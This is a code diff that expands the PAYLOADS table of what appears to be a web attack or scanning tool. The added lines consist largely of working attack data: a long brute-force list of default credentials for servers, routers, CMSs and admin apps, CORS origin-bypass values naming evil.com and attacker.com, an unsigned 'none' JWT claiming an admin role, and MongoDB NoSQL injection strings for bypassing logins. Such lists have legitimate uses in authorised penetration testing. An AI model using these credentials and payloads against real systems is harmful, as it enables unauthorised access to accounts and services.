@@ -110,22 +110,62 @@ const PAYLOADS = {
     { "Referer": "http://localhost/admin" }, { "X-Custom-IP-Authorization": "127.0.0.1" },
   ],
   auth_brute: [
+    // ── Universal defaults ──────────────────────────────────────────────────
     { u: "admin", p: "admin" }, { u: "admin", p: "password" }, { u: "admin", p: "123456" },
-    { u: "admin", p: "admin123" }, { u: "root", p: "root" }, { u: "admin", p: "" },
-    { u: "administrator", p: "administrator" }, { u: "admin", p: "letmein" },
-    { u: "admin", p: "qwerty" }, { u: "test", p: "test" }, { u: "admin", p: "pass" },
-    { u: "user", p: "user" }, { u: "guest", p: "guest" }, { u: "admin", p: "1234" },
+    { u: "admin", p: "admin123" }, { u: "admin", p: "" }, { u: "admin", p: "letmein" },
+    { u: "admin", p: "qwerty" }, { u: "admin", p: "pass" }, { u: "admin", p: "1234" },
+    { u: "admin", p: "12345" }, { u: "admin", p: "password1" }, { u: "admin", p: "admin1" },
+    { u: "admin", p: "changeme" }, { u: "admin", p: "default" }, { u: "admin", p: "secret" },
+    { u: "admin", p: "pass123" }, { u: "admin", p: "abc123" }, { u: "admin", p: "welcome" },
+    // ── Common alternate usernames ──────────────────────────────────────────
+    { u: "root", p: "root" }, { u: "root", p: "toor" }, { u: "root", p: "password" },
+    { u: "root", p: "" }, { u: "root", p: "123456" }, { u: "root", p: "alpine" },
+    { u: "administrator", p: "administrator" }, { u: "administrator", p: "password" },
+    { u: "administrator", p: "" }, { u: "administrator", p: "admin" },
+    { u: "user", p: "user" }, { u: "user", p: "password" }, { u: "user", p: "" },
+    { u: "test", p: "test" }, { u: "test", p: "password" }, { u: "test", p: "" },
+    { u: "guest", p: "guest" }, { u: "guest", p: "" }, { u: "guest", p: "password" },
+    { u: "demo", p: "demo" }, { u: "demo", p: "password" },
+    { u: "support", p: "support" }, { u: "operator", p: "operator" },
+    { u: "sa", p: "" }, { u: "sa", p: "sa" }, { u: "postgres", p: "postgres" },
+    { u: "mysql", p: "mysql" }, { u: "oracle", p: "oracle" }, { u: "pi", p: "raspberry" },
+    // ── Service/device default credentials ─────────────────────────────────
+    { u: "cisco", p: "cisco" }, { u: "enable", p: "enable" }, { u: "admin", p: "cisco" },
+    { u: "admin", p: "1111" }, { u: "admin", p: "0000" }, { u: "admin", p: "9999" },
+    { u: "admin", p: "admin@123" }, { u: "admin", p: "Admin@123" }, { u: "Admin", p: "Admin" },
+    { u: "ubnt", p: "ubnt" }, { u: "netgear", p: "netgear" }, { u: "linksys", p: "admin" },
+    { u: "admin", p: "router" }, { u: "admin", p: "motorola" }, { u: "admin", p: "synology" },
+    // ── WordPress / CMS defaults ────────────────────────────────────────────
+    { u: "admin", p: "wordpress" }, { u: "admin", p: "wp-admin" }, { u: "wordpress", p: "wordpress" },
+    { u: "admin", p: "joomla" }, { u: "admin", p: "drupal" }, { u: "admin", p: "magento" },
+    // ── Common application defaults ─────────────────────────────────────────
+    { u: "admin", p: "zabbix" }, { u: "Admin", p: "zabbix" }, { u: "grafana", p: "admin" },
+    { u: "elastic", p: "" }, { u: "kibana", p: "" }, { u: "admin", p: "grafana" },
+    { u: "admin", p: "jenkins" }, { u: "admin", p: "sonar" }, { u: "admin", p: "nexus" },
+    { u: "admin", p: "harbor12345" }, { u: "admin", p: "Harbor12345" },
   ],
   jwt_attacks: [
     "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
   ],
   cors_origins: [
     "null", "http://evil.com", "https://attacker.com", "http://localhost", "file://",
+    "https://evil.trusted.com", "http://127.0.0.1", "http://0.0.0.0",
+    "https://trusted.com.evil.com", "http://localhost.evil.com",
+    "chrome-extension://abcdefghij", "moz-extension://abcdefghij",
   ],
   nosql: [
+    // MongoDB authentication bypass
     '{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}',
     '{"$regex": ".*"}', 'username[$ne]=xyz', 'password[$gt]=',
     '{"username": {"$ne": null}, "password": {"$ne": null}}',
+    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
+    '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
+    '{"$where": "function(){return true}"}',
+    '{"$where": "function(){sleep(5000); return true}"}',
+    // URL param injection (Mongoose)
+    'username[$ne]=invalid&password[$ne]=invalid',
+    'username[$exists]=true&password[$exists]=true',
+    'admin[$gt]=',
   ],
   // ── QuantumBreach: advanced / overlooked attack vectors ───────────────────
   request_smuggling: [
